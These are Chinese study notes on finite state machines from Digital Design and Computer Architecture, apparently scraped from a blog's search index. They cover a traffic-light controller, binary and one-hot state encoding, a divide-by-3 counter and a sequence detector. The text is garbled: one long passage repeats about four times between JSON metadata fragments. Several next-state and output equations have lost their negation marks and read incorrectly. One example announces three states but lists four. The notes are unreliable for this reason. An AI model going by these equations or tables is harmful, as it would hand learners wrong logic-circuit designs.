Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#342-state-encodings"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#binary-encoding"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#one-hot-encoding"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 